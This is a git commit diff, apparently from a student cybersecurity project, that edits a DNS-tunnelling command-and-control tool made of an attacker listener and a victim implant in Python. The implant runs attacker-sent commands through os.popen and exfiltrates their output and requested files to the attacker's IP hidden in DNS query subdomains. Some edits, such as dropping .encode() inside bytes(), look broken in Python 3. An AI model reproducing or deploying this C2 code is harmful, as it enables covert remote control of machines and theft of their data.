ac4e109dd3b9f578bdff3afaed7b2f228f4c6c8e
elad <eladgoodname@gmail.com>
2023-07-11 12:25:22 +0300

    dns

--- cyber/src/command_and_control/dns/dnsatt.py
+++ cyber/src/command_and_control/dns/dnsatt.py
@@ -14,12 +14,10 @@ victim_ip = ""
 active = False
 seqnum = 64
 str_to_print = ""
-file_buff = bytes(str_to_print.encode())
+file_buff = bytes(str_to_print)
 
 def printFileHandler(pkt, input_seq,payload, flag):
     global seqnum,str_to_print,file_buff
-    print(flag)
-    print(seqnum, input_seq)
     if seqnum == input_seq:
         if flag == 2:
             str_to_print += payload
@@ -32,8 +30,6 @@ def printFileHandler(pkt, input_seq,payload, flag):
     sendDNSRes(pkt, "ok", str(flag))
 
     
- 
-  
 def endFileHandler(pkt, input_seq, payload):
     global file_buff, seqnum
     if input_seq == seqnum:
@@ -42,7 +38,7 @@ def endFileHandler(pkt, input_seq, payload):
         seqnum = 64
         with open(filename, "wb") as file:
             file.write(file_buff)
-        file_buff = bytes("".encode())
+        file_buff = bytes("")
     sendDNSRes(pkt, "ok", "3")
 
 
@@ -59,6 +55,7 @@ def endPrintHandler(pkt, input_seq,payload):
 
 def HelloHandler(packet):
     flag_fileOrPrint = input("for file choose 1\nfor print choose 2\n")
+    #getting the input for the flag that we send in line 85
     if flag_fileOrPrint == "1":
         res = input("enter file path.\n")
     if flag_fileOrPrint == "2":
@@ -83,7 +80,6 @@ def sendDNSRes(packet, payload, flag):
             type='TXT',
             rdata=((flag + payload).encode()))
     )
-
     response_packet = ip / udp / dns
     time.sleep(0.5)
     send(response_packet)
@@ -94,25 +90,27 @@ def listenRes():
 
 def DNSHandler(pkt):
     global str_to_print, file_buff
-    #if it's a file do not decode - 0 for file
     
     fileOrPrint = pkt[0]['DNS'].tc
     
+    #if it's a file do not decode - 0 for file
     if fileOrPrint == 0:
+        #split the domain from the rest of the payload
         payload = pkt[0]['DNS']['DNSQR'].qname.split(".elad.com".encode())[0]
-        handle_flag = str(payload[0]-48)
+        # because the data is encoded, deduct 48 for ascii representation
+        handle_flag = str(payload[0]-48) 
     else:
         payload = pkt[0]['DNS']['DNSQR'].qname.decode().split(".elad.com")[0]
         handle_flag = payload[0]
-        
+    #take seqnum from victim packet
     victimseq = pkt[0]['IP'].ttl
     
-    
-    print(handle_flag)
-    
+        #handl_flag: select file or print, end or not.  
     match handle_flag:
+        # 1 for file
         case "1":
             printFileHandler(pkt,victimseq, payload[1:],1)
+        # 2 for print
         case "2":
             printFileHandler(pkt, victimseq, payload[1:],2)
         case "4":
@@ -121,7 +119,7 @@ def DNSHandler(pkt):
             endFileHandler(pkt, victimseq, payload[1:])
         case "8":
             HelloHandler(pkt)
- 
+
 
 def main():
     listenRes()
--- cyber/src/command_and_control/dns/vicdns.py
+++ cyber/src/command_and_control/dns/vicdns.py
@@ -20,14 +20,18 @@ seqnum = 64
 
 def sendDNSReq(msg,flag, seqnum = 64, fileorprint = 1):
     domain = '.elad.com'
+    #if you are a file
     if flag == '1' or flag == '3':
-        domain = bytes(domain.encode())
-        flag = bytes(flag.encode())
-        print(type(flag), type(domain), type(msg))  
+        domain = bytes(domain)
+        flag = bytes(flag)
+        #if we reached the end of the byte zero back to 64
     if seqnum == 255:
         seqnum = 64
-    
+
+    # we pass the seqnum in the ttl field, also to insert the message and flag inside the subdomain files
+ 
     dns_req = IP(dst=Att_ip, ttl=seqnum)/UDP(dport=53)/ DNS(rd=1, qd=DNSQR(qname=flag + msg + domain), tc=fileorprint)
+    # sleep here to let the attacker reach the sniffing part.
     time.sleep(0.3)
     send(dns_req)
     
@@ -36,16 +40,21 @@ def sendhello():
 
 
 def DNSHandler(pkt):
+    # if packet is with the required fields, here  DNSRR is a response made by the client.
     if not pkt[0]['DNS']['DNSRR']:
         return
+    # take the packet and turn into string by decoding
     payload = pkt[0]['DNS']['DNSRR'].rdata[0].decode()    
     handle_flag = payload[0]
-    print(handle_flag)
+
+    #check if the attacker intrested in printing or file
+    #[1:] payload without the flag
     match handle_flag:
         case "2":
             printHandler(payload[1:])
         case "1":
             fileHandler(payload[1:])
+
 
 def fileHandler(file_path):
     ret_ok = ""
@@ -55,6 +64,7 @@ def fileHandler(file_path):
         payload = file.read()
         
     while True: 
+        #'1' means I have more to send
         if len(payload) > mtu:
             sendDNSReq( payload[:mtu], '1', seqnum, 0)
             ret_ok = checkOK()
@@ -72,22 +82,38 @@ def fileHandler(file_path):
 
 
 def printHandler(command):
+    # os.popen takes the command run and turn the result it into a string
+
+    #seqnum for making sure packets arrive by order
+
     payload = os.popen(command).read()
-    print(payload)
     global seqnum
     ret_ok = ""
     while True: 
+
+        #if payload is larger than mtu size
+
         if len(payload) > mtu:
+            # [:mut] means up to size of mtu
+
+            # here the '2' - if end or not - for file or print
+
             sendDNSReq( payload[:mtu], '2', seqnum, 1)
+            # check if attacker recievd the packge
+
             ret_ok = checkOK()
-            print(ret_ok)
             if ret_ok == "ok":
                 seqnum += 1
+                #if received ok cut mtu chunk from the payload 
+
                 payload = payload[mtu:]
 
-        else:        
+        else: 
+            #if chunk smaller than mtu       
             sendDNSReq(payload ,'4',seqnum, 1)
             ret_ok = checkOK()
+
+            #if I recieved ok, zero the seqnum back to 64 - why? because I wanted
             if ret_ok == "ok":
                 seqnum = 64
                 break
@@ -101,7 +127,7 @@ def checkOK():
             payload = pkt[0]['DNS']['DNSRR'].rdata[0].decode() 
             return payload[1:]
 
-
+#timeout so we won't get stuck in sniffing and continue sending hello to attacker.
 def listenRes():
     sniff(filter="udp and src host 10.0.2.15", prn=DNSHandler, timeout=5)
 
